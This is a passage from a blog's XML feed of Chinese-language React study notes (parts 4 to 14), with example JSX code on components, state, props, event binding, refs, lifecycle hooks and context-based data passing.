        <tag>react-基础知识复习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(八)]]></title>
    <url>%2F2018%2F09%2F07%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AB)%2F</url>
    <content type="text"><![CDATA[react中的组件有两个非常重要的概念： 1、组件的属性：(只读)调取组件的时候传递进来的属性 2、组件的状态：[读写]自己在组件中设定和规划的(只有类声明式组件才有状态的管控，函数式组件声明不存在状态管理) 组件状态类似于Vue中的数据驱动：我们数据绑定的时候是基于状态值绑定，当修改组件状态后，对应的JSX元素也会跟着重新渲染(差异渲染：只把数据改变的部分重新渲染;基于DOM-DIFF算法完成) 当代框架最核心的思想就是：“数据操控视图(视图影响数据)”,让我们告别别JQ手动操作DOM的时代，我们以后只需要改变数据，框架会帮我们重新渲染视图,从而减少直接操作DOM(提高性能，也有助于开发效率) 函数式声明组件所谓函数式组件是静态的：和执行普通函数是一样的，调取一次组件，就把组件中的内容获取到，插入到页面中，如果不重新调取组件，显示的内容时不会发生任何改变 真实项目之一调取组件，组件中的内容不会再改变的情况下，我们才能使用函数式组件 1234567891011function Clock() &#123; return &lt;div&gt; &lt;h3&gt;当前北京时间是：&lt;/h3&gt; &lt;div style=&#123;&#123;color:'red',fontSize:'bold'&#125;&#125;&gt;&#123;new Date().toLocaleString()&#125;&lt;/div&gt; &lt;/div&gt;;&#125;setInterval(()=&gt;&#123; // 每个1000ms重新调取组件，然后渲染到页面中 ReactDOM.render(&lt;Clock/&gt;,root);&#125;,1000) 类声明组件修改组件的状态： 1、修改部分状态：会用我们传递的对象和初始化的state进行匹配，只把我们传递的属性进行修改，没有传递的依然保留原始的状态信息(部分状态修改) 2、当状态修改完成，会通知react把组件JSX中的元素重新进行渲染 12345678910111213141516171819202122232425262728293031323334353637class Clock extends React.Component &#123; constructor() &#123; super(); // 初始化组件的状态:要求我们在constructor中把后面使用的状态信息全部初始化一下(这是约定俗称的语法规范) this.state= &#123; time:new Date().toLocaleString() &#125; &#125; render() &#123; return &lt;div&gt; &lt;h3&gt;当前北京时间是：&lt;/h3&gt; &lt;div style=&#123;&#123; color: 'red', fontSize: 'bold' &#125;&#125;&gt; &#123;/* 获取组件的状态信息 */&#125; &#123;this.state.time&#125; &lt;/div&gt; &lt;/div&gt;; &#125; componentDidMount()&#123; //生命周期函数之一：第一次组件渲染完成后出发(我们只需要间隔1s把state状态中的time数据改变，这样react会自动帮我们把组件中的部分内容进行重新渲染) setInterval(()=&gt;&#123; // react中虽然下面方式可以修改状态，但是并不会通知react重新渲染页面，所以不要这样操作和修改状态 // this.state.time = new Date().toLocaleString(); /** * 修改组件的状态： * 1、修改部分状态：会用我们传递的对象和初始化的state进行匹配，只把我们传递的属性进行修改，没有传递的依然保留原始的状态信息(部分状态修改) * 2、当状态修改完成，会通知react把组件JSX中的元素重新进行渲染 */ this.setState(&#123; time:new Date().toLocaleString() &#125;,()=&gt;&#123; //当通知react把需要重新渲染的JSX元素渲染完成后，执行的回调操作(类似于生命周期函数中的componentDidUpdate,项目中一般使用钩子函数而不是这个回调) // 设置的回调函数的原因：setState是异步的操作 &#125;) &#125;,1000) &#125;&#125;]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react学习笔记</tag>
        <tag>react组件中的状态(数据驱动思想)</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(十二)]]></title>
    <url>%2F2018%2F09%2F07%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%BA%8C)%2F</url>
    <content type="text"><![CDATA[符合组件之间的信息传递父组件把信息传递给子组件基于属性传递即可(而且传递是单方向的:只能父亲通过属性把信息给儿子,儿子不能直接把信息作为属性传递给父亲) 后期子组件如果信息需要修改：可以让父组件传递给子组件的信息发送变化(子组件接收的属性发生变化,组件会重新渲染=&gt;触发componentWillReceiveProps钩子函数) 只要实现点击子组件body中按钮的时候,可以修改父组件panel的状态信息(n).panel的状态改变，panel会重新的执行render渲染,而重新执行render的时候,会把最新的状态值作为属性传递给子组件head,head组件接收的属性值发生改变,head组件也会重新渲染 子组件修改父组件中的属性类似于这种”子改父”的操作,我们需要使用一下技巧完成： 1、把父组件中的一个方法,作为属性传递给子组件 2、在子组件中,把基于属性传递进来的方法,在合适的时候执行(相当于在执行父组件中的方法:而这个方法中完全可以操作父组件中的信息) 实现过程 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import React from 'react';import ReactDOM from 'react-dom';import 'bootstrap/dist/css/bootstrap.css';import PropTypes from "prop-types";// head组件class Head extends React.Component&#123; constructor()&#123; super(); &#125; render()&#123; return &lt;div className="panel-heading"&gt; &#123;/* 子组件通过属性获取父组件传递的内容 */&#125; &lt;h3&gt;点击次数:&#123;this.props.count&#125;&lt;/h3&gt; &lt;/div&gt; &#125;&#125;// bedyclass Body extends React.Component&#123; constructor()&#123; super(); &#125; render()&#123; return &lt;div className="panel-body"&gt; &lt;button className="btn btn-success" onClick=&#123;this.props.callBack&#125;&gt;点我啊&lt;/button&gt; &lt;/div&gt; &#125;&#125;class Panel extends React.Component&#123; constructor ()&#123; super(); this.state=&#123; n:0 &#125; &#125; render()&#123; return &lt;section className="panel panel-default" style=&#123;&#123; width:'50%', margin:'0 auto' &#125;&#125;&gt; &#123;/* 父组件在调取子组件的时候，把信息通过属性传递给子组件 */&#125; &lt;Head count=&#123;this.state.n&#125;&gt;&lt;/Head&gt; &#123;/* 父组件把自己的一个 方法基于属性传递给子组件，目的是在组件中执行这个方法 */&#125; &lt;Body callBack=&#123;this.fn&#125;&gt;&lt;/Body&gt; &lt;/section&gt; &#125; fn = ()=&gt;&#123; // 修改panel的状态信息 this.setState(&#123; n:this.state.n+1 &#125;) &#125;&#125;ReactDOM.render(&lt;Panel/&gt;,root);]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react学习笔记</tag>
        <tag>react-复合组建之间的信息传递</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(四)]]></title>
    <url>%2F2018%2F09%2F07%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)%2F</url>
    <content type="text"><![CDATA[react组件不管是Vue还是react框架,设计之初都是期望我们按照”组件/模块管理”的方式来构建程序的，也就是把一个程序划分为一个个的组件来单独处理 [优势]： 1、有助于多人协作开发 2、我们开发的组件可以被复用 … react中创建组件有两种方式： 1、函数声明式组件 component/Dialog.js 每一个组件中都要导入react,因为需要基于它的createElement把JSX进行解析渲染 1.函数执行的返回结果是一个新的JSX(也就是当前组件的JSX结构)2.props变量存储的值是一个对象,包含了调取组件时候传递的属性值(不传递是一个空对象) 123456789101112131415161718192021222324import React from "react";//=&gt;每一个组件中都要导入react,因为需要基于它的createElement把JSX进行解析渲染/** * 函数式声明组件 * 1.函数执行的返回结果是一个新的JSX(也就是当前组件的JSX结构) * 2.props变量存储的值是一个对象,包含了调取组件时候传递的属性值(不传递是一个空对象) */export default function Dialog(props) &#123; let &#123; con, lx = 0 ,children&#125; = props, title = lx === 0 ? '系统提示' : '系统警告'; //=&gt;children:可能有可能没有,可能只是一个值,也可能每一项是一个字符串,也可能是一个对象等(都代表双闭合组件中的子元素) return &lt;section&gt; &lt;h2&gt;&#123;title&#125;&lt;/h2&gt; &lt;div&gt;&#123;con&#125;&lt;/div&gt; &#123;/*把属性中传递的子元素放到组件中的指定位置*/&#125; &#123;/* &#123;&#123;children&#125;&#125; */&#125; &#123;/*也可以基于react中提供的专门遍历children的方法来完成遍历操作*/&#125; &#123; React.Children.map(children,item=&gt;item) &#125; &lt;/section&gt;;&#125;; index.js 123456789101112131415import React from 'react';import ReactDOM from 'react-dom';import Dialog from "./component/Dialog";//从react-dom当中导入一个ReactDOM,逗号后面的内容时把ReactDOM这个对象进行解构import &#123;render&#125; from 'react-dom';// React.createElement(type,props,children)let root = document.querySelector("#root");ReactDOM.render(&lt;div&gt; &#123;/*加注释：调取组件,只需要把组件当做一个标签调取使用即可 单闭合和双闭合都可以*/&#125; &lt;Dialog con='哈哈哈'/&gt; &lt;Dialog con='嘿嘿嘿' lx=&#123;2&#125;&gt;&#123;/*属性值不是字符串，我们需要使用大括号包起来*/&#125; &lt;span&gt;1&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;&lt;/Dialog&gt;&lt;/div&gt;,root); 2、基于继承component类来创建组件 src-&gt;component：这个文件夹中存放的就是开发的组件 函数式组件的渲染机制知识点：createElement在处理的时候,遇到一个组件,返回的对象中：type就不再是字符串标签名了,而是一个函数(类),但是属性还是存在props中 12345678&#123; type:Dialog, props:&#123; lx:1, con:'xxx', children:一个值或者一个数组 &#125;&#125; render渲染的时候，我们需要做处理： 首先判断type的类型,如果是字符串,就创建一个元素标签,如果函数或者类,就把函数执行，把props中的每一项(包含children)传递给函数 在执行函数的时候，把函数中return的JSX转换为新的对象(通过createElement),把这个对象返回;紧接着render按照以往的渲染方式,创建DOM元素,插入到指定的容器中即可]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react学习笔记</tag>
        <tag>react函数式组件的基础语法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(七)]]></title>
    <url>%2F2018%2F09%2F07%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)%2F</url>
    <content type="text"><![CDATA[介绍react中的属性管理123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import React from 'react';import ReactDOM from 'react-dom';import PropTypes from "prop-types";function Sum() &#123; console.log(this);//undefined return &lt;div&gt; 函数声明~ &lt;/div&gt;&#125;class Dialog extends React.Component&#123; constructor(props)&#123;//props,context,updater super(props); &#125; render()&#123; // this.props.con = '嘿嘿嘿';会报错,组件中的属性是调取组件的时候(创建类实例的时候)传递给组件的信息,而这部分信息是"只读的"(只能获取不能修改)=&gt;组件的属性是只读的" let &#123;lx,con&#125; = this.props; return &lt;section&gt; &lt;h3&gt;&#123;lx||'系统提示'&#125;&lt;/h3&gt; &lt;div&gt;&#123;con&#125;&lt;/div&gt; &lt;/section&gt;; &#125; componentDidMount()&#123; //渲染完成 &#125; // this.props这个属性是只读的,我们无法再方法中修改它的值,但是可以给其设置默认值或者设置一些规则(例如：设置是否是必须传递的以及传递值得类型等) static defaultProps = &#123; lx:'系统提示' &#125;; // prop-types是Facebook公司开发的一个插件，基于这个插件我们可以给组件传递的属性设置规则(设置的规则不会影响页面的渲染，但是会在控制台抛出警告) static propTypes = &#123; //con:PropTypes.string//=&gt;传递的内容需要是字符串 con:PropTypes.string.isRequired//=&gt;不仅传递的内容时字符串并且还必须传递 &#125;&#125;ReactDOM.render(&lt;div&gt; xiaoke &lt;Sum/&gt; &lt;Dialog lx=&#123;2&#125; con="哈哈哈"&gt; &lt;span&gt;我是子元素&lt;/span&gt; &lt;/Dialog&gt;&lt;/div&gt;,root);let obj = &#123; type:'div', props:&#123; children:[ 'xiaoke', &#123; type:Dialog, props:&#123; lx:2, children:null &#125; &#125; ] &#125;&#125;]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react学习笔记</tag>
        <tag>react组件中的属性管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(十)]]></title>
    <url>%2F2018%2F09%2F07%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%8D%81)%2F</url>
    <content type="text"><![CDATA[Vue：[MVVM]数据更改视图跟着更改，视图更改数据也跟着更改(双向数据绑定)react：[MVC]数据更改视图跟着更改(原本是单向的数据绑定,但是我们可以构建出双向的效果) 123456789101112131415161718192021222324252627282930313233343536373839import React from 'react';import ReactDOM from 'react-dom';import 'bootstrap/dist/css/bootstrap.css';import PropTypes from "prop-types";class Temp extends React.Component&#123; static propTypes = &#123; &#125; constructor()&#123; super(); this.state = &#123; text:'柯金珠' &#125; &#125; componentDidMount()&#123; setTimeout(() =&gt; &#123; this.setState(&#123; text:'kjz' &#125;) &#125;, 1000); &#125; render()&#123; return &lt;section className="panel panel-default"&gt; &lt;div className="panel-heading"&gt; &lt;input type="text" name="" id="" className="form-control" value="text" onChange=&#123;ev=&gt;&#123; //=&gt;在onChange中实现修改状态 this.setState(&#123; text:ev.target.value &#125;) &#125;&#125;/&gt; &lt;/div&gt; &lt;div className="panel-body"&gt; &#123;text&#125; &lt;/div&gt; &lt;/section&gt; &#125;&#125;ReactDOM.render(&lt;Temp/&gt;,root);]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react学习笔记</tag>
        <tag>react-基于表单元素的onchange实现MVVM双向绑定</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(九)]]></title>
    <url>%2F2018%2F09%2F07%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B9%9D)%2F</url>
    <content type="text"><![CDATA[JSX中的事件绑定12345678render()&#123; return &lt;button className="btn btn-success" onClick=&#123;this.support&#125;&gt;支持 &lt;/button&gt;&#125;support(ev)&#123; //=&gt;this:undefined(不是我们理解的操作的元素) //=&gt;ev.target:通过事件源可以获取当前操作的元素(一般很少操作,因为框架一般都是数据驱动所有DOM的改变)&#125; 如果能让方法中的this变成当前类的实例就好了，这样就可以操作属性和状态等信息 123456789render()&#123; //=&gt;this指向实例,bind改变一下this指向 return &lt;button className="btn btn-success" onClick=&#123;this.support.bind(this)&#125;&gt;支持 &lt;/button&gt;&#125;support(ev)&#123; //=&gt;this:undefined(不是我们理解的操作的元素) //=&gt;ev.target:通过事件源可以获取当前操作的元素(一般很少操作,因为框架一般都是数据驱动所有DOM的改变)&#125; 每次用bind来写很麻烦，我们来看另外一种写法 render(){ //=&gt;this指向实例,bind改变一下this指向 return 支持 }support=ev=&gt;{ //=&gt;this:undefined(不是我们理解的操作的元素) //=&gt;ev.target:通过事件源可以获取当前操作的元素(一般很少操作,因为框架一般都是数据驱动所有DOM的改变) 箭头函数：没有this，继承上下文中的this(实例),真实项目中,我们给JSX元素绑定的事件方法一般都是箭头函数,目的是为了保证函数中的this还是实例 } 数据驱动版完整代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import React from 'react';import ReactDOM from 'react-dom';import 'bootstrap/dist/css/bootstrap.css';import PropTypes from "prop-types";class Vote extends React.Component &#123; //组件传递的属性是只读的,我们为其设置默认值和相关规则 static defaultProps = &#123; &#125;; static propTypes = &#123; title: PropTypes.string.isRequired &#125; constructor(props) &#123; super(props); // init state: 初始化状态 this.state = &#123; n: 0,//=&gt;支持人数 m: 0//反对人数 &#125;; &#125; render() &#123; let &#123; n, m &#125; = this.state, rate = (n + m) === 0 ? '0%' : ((n / (n + m) * 100).toFixed(2) + '%'); return &lt;section className="panel panel-default" style=&#123;&#123; width: '60%', margin: '20px auto' &#125;&#125;&gt; &lt;div className="panel-heading"&gt; &lt;h3 className="panel-title" style=&#123;&#123; textAlign: 'center' &#125;&#125;&gt;&#123;this.props.title&#125;&lt;/h3&gt; &lt;/div&gt; &lt;div className="panel-body"&gt; 支持人数：&#123;n&#125; &lt;br /&gt; &lt;br /&gt; 反对人数：&#123;m&#125; &lt;br /&gt; &lt;br /&gt; 支持率：&#123;rate&#125; &lt;/div&gt; &lt;div className="panel-footer"&gt; &lt;button className="btn btn-success" onClick=&#123;this.support&#125;&gt;支持 &#123;/* 这么写this变成undefined */&#125; &lt;/button&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;button className="btn btn-danger" onClick=&#123;this.againist&#125;&gt;反对&lt;/button&gt; &lt;/div&gt; &lt;/section&gt;; &#125; // 投票：支持,用箭头函数，是this指向实例 support=ev=&gt;this.setState(&#123;n:this.state.n+1&#125;); // 投票：反对 againist=ev=&gt;this.setState(&#123;m:this.state.m+1&#125;)&#125;ReactDOM.render(&lt;main&gt; &lt;Vote title='世界杯小组赛法国VS秘鲁,法国队必胜' /&gt; &lt;Vote title="世界杯小组赛阿根廷VS克罗地亚,壮哉我大梅西" /&gt;&lt;/main&gt;, root); refs:是react中专门提供通过操作DOM来实现需求的方式，它是一个对象，存储了当前组件中所有设置了ref属性的元素(元素ref属性值是啥,refs中存储的元素的属性名就是啥) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import React from 'react';import ReactDOM from 'react-dom';import 'bootstrap/dist/css/bootstrap.css';import PropTypes from "prop-types";class Vote extends React.Component &#123; //组件传递的属性是只读的,我们为其设置默认值和相关规则 static defaultProps = &#123; &#125;; static propTypes = &#123; title: PropTypes.string.isRequired &#125; constructor(props) &#123; super(props); &#125; render() &#123; return &lt;section className="panel panel-default" style=&#123;&#123; width: '60%', margin: '20px auto' &#125;&#125;&gt; &lt;div className="panel-heading"&gt; &lt;h3 className="panel-title" style=&#123;&#123; textAlign: 'center' &#125;&#125;&gt;&#123;this.props.title&#125;&lt;/h3&gt; &lt;/div&gt; &lt;div className="panel-body"&gt; 支持人数：&lt;span ref='spanLeft'&gt;&lt;/span&gt; &lt;br /&gt; &lt;br /&gt; 反对人数：&lt;span ref='spanRight'&gt;&lt;/span&gt; &lt;br /&gt; &lt;br /&gt; 支持率：&lt;span ref='spanRate'&gt;&lt;/span&gt; &lt;/div&gt; &lt;div className="panel-footer"&gt; &lt;button className="btn btn-success" onClick=&#123;this.support&#125;&gt;支持 &#123;/* 这么写this变成undefined */&#125; &lt;/button&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;button className="btn btn-danger" onClick=&#123;this.againist&#125;&gt;反对&lt;/button&gt; &lt;/div&gt; &lt;/section&gt;; &#125; // 投票：支持,用箭头函数，是this指向实例 support=ev=&gt;&#123; let &#123;spanLeft&#125; = this.refs; spanLeft.innerHTML++; this.computed(); &#125; // 投票：反对 againist=ev=&gt;&#123; let &#123;spanRight&#125; = this.refs; spanRight.innerHTML++; this.computed(); &#125;; computed = ()=&gt;&#123; let &#123;spanLeft,spanRight,spanRate&#125; = this.refs, n = parseFloat(spanLeft.innerHTML), m = parseFloat(spanRight.innerHTML), rate = (n+m)===0?'0%':((n/(n+m)*100).toFixed(2)+'%'); spanRate.innerHTML = rate; &#125;&#125;ReactDOM.render(&lt;main&gt; &lt;Vote title='世界杯小组赛法国VS秘鲁,法国队必胜' /&gt; &lt;Vote title="世界杯小组赛阿根廷VS克罗地亚,壮哉我大梅西" /&gt;&lt;/main&gt;, root); 在react组件中： 1、基于数据驱动(修改状态数据,react帮助我们重新渲染视图)完成的组件叫做”受控组件(受数据控制的组件)” 2、基于REF操作DOM实现视图更新的，叫做”非受控组件” =&gt; 真实项目中，建议多使用”受控组件”]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react学习笔记</tag>
        <tag>react-投票案例(运用数据驱动的思想)</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(十一)]]></title>
    <url>%2F2018%2F09%2F07%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B8%80)%2F</url>
    <content type="text"><![CDATA[生命周期函数(钩子函数)描述一个组件或者程序从创建到销毁的过程，我们可以在过程中间基于钩子函数完成一些自己的操作(例如：在第一次渲染完成做什么,或者在第二次即将重新渲染之前做什么等…) [基本流程] constructor 创建一个组件 componentWillMount 第一个渲染之前 render 第一次渲染 componentDidMount 第一次渲染之后 [修改流程]当组件的状态数据发生改变(setState)或者传递给组件的属性(重新调用组件，传递不同的属性)都会引发render重新执行渲染(渲染也是差异渲染(哪个跟之前不一样，才渲染)) shouldComponentUpdate 是否允许组件重新渲染(允许则执行后面函数,不允许直接结束即可) componentWillUpdate 重新渲染之前 render 第二次及以后重新渲染 componentDidUpdate 重新渲染之后 componentWillReceiveProps：父组件把传递给子组件的属性发生改变后触发的钩子函数 [卸载]原有渲染的内容是不消失的，只不过以后不能基于数据改变视图了 ComponentWillUnmount：卸载组件之前(一般不用) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import React from 'react';import ReactDOM from 'react-dom';import 'bootstrap/dist/css/bootstrap.css';import PropTypes from "prop-types";function queryData() &#123; return new Promise((resolve,reject)=&gt;&#123; setTimeout(() =&gt; &#123; resolve() &#125;, 3000); &#125;)&#125;class A extends React.Component&#123; static defaultProps = &#123;&#125;;//这是第一个执行的，执行完成之后(给属性设置默认值)才向下执行 constructor()&#123; super(); console.log('1=construtor'); this.state(&#123; n:1 &#125;); &#125; componentWillMount()&#123; // 第一次渲染执行 console.log('2=WillMount:第一次渲染之前',this.refs.hh);//undefined // 在WillMount中，如果直接的set-state修改数据，会把状态信息改变后，然后人的人和Didmount；但是如果set-state是放到一个异步操作中完成(例如：定时器或者从服务器获取数据)，也是先执行render和Did，然后再执行这个异步操作修改状态，紧接着走修改的流程(这样和放到Did_Mount中没有区别),所以我们一般把数据请求放到Did中处理 // 所以真实项目中的数据绑定，一般第一次组建渲染，我们都是绑定的默认数据，第二次才是绑定的从服务器获取的数据(有些需求我们需要根据是否存在判断显示隐藏符) this.setState(&#123; n:3 &#125;) &#125; async willMount()&#123; console.log('willMount'); let result = await queryData(); this.setState(&#123; n:result &#125;) &#125; componentDidMount()&#123; console.log('4=DidMount:第一次渲染完成',this.ref.hh);//div /** * 真实项目中这个阶段，一般做如下处理： * 1.控制状态信息的操作 * 2.从服务器获取数据，然后修改状态信息，完成数据绑定 */ // setInterval(()=&gt;&#123; // this.setState(&#123; // n:2 // &#125;); // &#125;,5000) &#125; shouldComponentUpdate(nextProps,nextState)&#123; // 是否允许更新，在这个钩子函数中，我们获取到的state不是最新修改的，而是上一次的state的值 // 例如：第一次加载完成，5000ms之后。我们基于set-state把n修改为2，但是此处获取的还是1 // 但是这个方法有两个参数： // 1.nextProps:最新修改的属性 // 2.nextState:最新修改的状态信息 console.log('5=是否允许更新,返回true就是允许，返回false就是不允许'); &#125; componentWillUpdate()&#123; //组件更新之前 // 这里获取的状态也是更新之前的 console.log('6=组件更新之前'); &#125; componentDidUpdate(nextProps,nextState)&#123; // 这里获取的状态是更新之后的(和should相同也有两个参数存储最新的ii纳西) console.log('7=组件更新之后'); &#125; render()&#123; console.log('3=render'); return &lt;div ref='hh'&gt; &#123;this.state.n&#125; &lt;/div&gt; &#125;&#125;ReactDOM.render(&lt;A/&gt;,root);]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react学习笔记</tag>
        <tag>react组件的生命周期</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(六)]]></title>
    <url>%2F2018%2F09%2F07%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)%2F</url>
    <content type="text"><![CDATA[基于继承component类来创建组件基于createElement把JSX转换为一个对象，当render渲染这个对象的时候，遇到type是一个函数或者类，不是直接创建元素，而是先把方法执行; 如果就是函数式声明组件，就把它当做普通方法执行(方法中的this是undefined),把函数返回的JSX元素(也是解析后的对象)进行渲染 如果是类声明式的组件，会把当前类new它执行，创建类的一个实例(当前本次调取的组件就是它的实例),执行constructor之后，会执行this.render(),把render返回的JSX拿过来渲染，所以”类”声明式组件,必须有一个render方法,方法需要返回一个JSX元素 但是不管哪一种方式，最后都会把解析出来的props属性对象作为实参传递给对应的函数或者类 总结创建组件有两种方式”函数式”、”创建类式” 函数式 1、操作非常简单 2、能实现的功能也很简单，只是简单的调取和返回JSX而已 3、 创建类式 1、操作相对复杂一些，但是也可以实现更为复杂的业务功能 2、能够使用生命周期函数操作业务 3、函数式可以理解为静态组件(组件中的内容调取的时候就已经固定了,很难在修改),而类这种方式交由基于组件内部的状态更新渲染的内容 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import React from 'react';import ReactDOM from 'react-dom';function Sum() &#123; console.log(this);//undefined return &lt;div&gt; 函数声明~ &lt;/div&gt;&#125;class Dialog extends React.Component&#123; constructor(props)&#123;//props,context,updater super(props);//=&gt;ES6中extends继承，一旦使用了constructor,第一行位置必须设置super执行，相当于React.Component.call(this),也就是call继承,把父类私有的属性继承过来 // =&gt;如果只写super()：虽然创建实例的时候把属性传递进来了，但是并没有传递父组件,也就是没有吧属性挂载到实例上,使用this.props获取的结果是undefined // =&gt;如果super(props)：在继承父类私有属性的时候,就把传递的属性挂载到了子类的实例上,constructor中就可以使用this.props了 // =&gt;props:当render渲染并且把当前类执行创建实例的时候，会把之前JSX解析出来的props对象中的信息(可能有children)传递给参数props "调取组件传递的属性" /** * this.props:属性集合 * this.refs:ref集合(非受控组件中用到) * this.context:执行上下文 * this.updater: */ console.log(props); console.log(this.props); //=&gt;及时在constructor中不设置形参props接收属性，执行super的时候也不传这个属性,除了constructor中不能直接使用this.props,其他声明周期函数中都可以使用(也就是执行完成constructor，react已经帮我们把传递的属性接收,并且挂载到实例上了) &#125; // componentWillMount()&#123; // //第一次渲染之前 // console.log(this.props); // &#125; render()&#123; // console.log(this.props); return &lt;section&gt; &lt;h3&gt;系统提示&lt;/h3&gt; &lt;div&gt;&lt;/div&gt; &lt;/section&gt;; &#125;&#125;ReactDOM.render(&lt;div&gt; xiaoke &lt;Sum/&gt; &lt;Dialog lx=&#123;2&#125; con="哈哈哈"&gt; &lt;span&gt;我是子元素&lt;/span&gt; &lt;/Dialog&gt;&lt;/div&gt;,root);let obj = &#123; type:'div', props:&#123; children:[ 'xiaoke', &#123; type:Dialog, props:&#123; lx:2, children:null &#125; &#125; ] &#125;&#125;]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react学习笔记</tag>
        <tag>基于类创建React组件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(五)]]></title>
    <url>%2F2018%2F09%2F07%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94%EF%BC%89%2F</url>
    <content type="text"><![CDATA[自己手动封装的Dialog组件 index.js 1234567891011121314import React from 'react';import ReactDOM from 'react-dom';import 'bootstrap/dist/css/bootstrap.css';//我们一般都把程序中的公用样式放到index中导入,这样在其他组件中也可以使用了(webpack会把所有的组件最后都编译到一起,index是主入口)import Dialog from './component/Dialog';//2.导入bootstrap,需要导入的是不经过压缩处理的文件，否则无法编译(真实项目中bootstrap已经是过去式,后期项目中使用的都是ant来做)ReactDOM.render(&lt;main&gt;&lt;Dialog content='你很帅哦~'/&gt;&lt;Dialog type=&#123;2&#125; content="哎呀，有点丑"/&gt;&lt;Dialog type='登录先' content=&#123;&lt;div&gt; &lt;input type="text" className="form-control" placeholder="请输入用户名"/&gt; &lt;input type="text" className="form-control" placeholder="请输入密码"/&gt;&lt;/div&gt;&#125;/&gt;&lt;button className="btn btn-success"&gt;登录&lt;/button&gt;&lt;button className="btn btn-danger"&gt;取消&lt;/button&gt;&lt;/main&gt;,root); Dialog.js 1234567891011121314151617181920212223242526272829303132333435363738import React from "react";export default function Dialog(props) &#123; // 自己处理的样式 let objStyle = &#123; width:'50%', margin:'0 auto' &#125;; let &#123;type,content,children&#125; = props; // 类型处理 let typeVal = type||'系统提示'; if(typeof type ==="number")&#123; switch (type) &#123; case 0: typeVal = '系统提示'; break; case 1: typeVal = '系统警告'; break; case 2: typeVal = '系统错误'; break; &#125; &#125; return &lt;section className="panel panel-default " style=&#123;objStyle&#125;&gt; &lt;div className="panel-heading"&gt; &lt;h3 className="panel-title"&gt; 系统提示： &lt;/h3&gt; &lt;/div&gt; &lt;div className="panel-body"&gt; &#123;content&#125; &lt;/div&gt; &#123;/*如果传入了children，我们把内容放到尾部，不传什么都不显示*/&#125; &#123; children?&lt;div className="panel-footer"&gt;&#123;React.Children.map(children,item=&gt;item)&#125; &lt;/div&gt;:null&#125; &lt;/section&gt;&#125;]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react学习笔记</tag>
        <tag>封装Dialog组件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(十四)]]></title>
    <url>%2F2018%2F09%2F07%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%9B%9B)%2F</url>
    <content type="text"><![CDATA[复合组件：父组件嵌套子组件[传递信息的方式] A、父组件需要把信息传递给子组件 调取父组件的时候,把信息基于属性的方式传递给子组件(子组件props中存储传递的信息);这种方式只能父组件把信息传递给子组件,子组件无法直接把信息传递给父组件,也就是属性传递信息是反向传递的 1、基于属性传递 12345678910export default class Vote extends React.Component&#123; render()&#123; let &#123;title,count&#125;=this.props; return &lt;section&gt; &lt;VoteHead title=&#123;title&#125;/&gt; &lt;VoteBody/&gt; &lt;VoteFooter/&gt; &lt;/section&gt; &#125;&#125; 2、基于上下文传递 父组件先把需要传给后代元素(包括孙子元素)没用的信息都设置好(设置在上下文中),后代组件需要用到父组件中的信息,主动去父组件中调取使用即可 在父组件中： 1、设置子组件的上下文属性类型 static childContextTypes = {}; 2、获取子组件上下文(设置子组件的上下文属性信息) getChildContext() 1234567891011121314151617181920212223static childContextTypes = &#123; // 设置上下文中信息的类型 n:PropTypes.number, m:PropTypes.number&#125;;getChildContext()&#123; // return 的是啥,相当于往上下文当中放了啥 let &#123;count:&#123;n=0,m=0&#125;&#125;=this.props return &#123; n, m &#125;&#125;&lt;!-- 子组件中设置使用传递进来的上下文类型:设置哪个类型，子组件上下文当中才有哪个属性,不设置的是不允许使用的：this.context.xxx --&gt;&lt;!-- 指定的上下文属性类型需要和父组件中指定的类型保持一致，否则报错 --&gt;&lt;!-- 子组件主动获取需要的信息：类型需要和设置的一样,否则报错，并且你需要啥就使用啥即可 --&gt;static 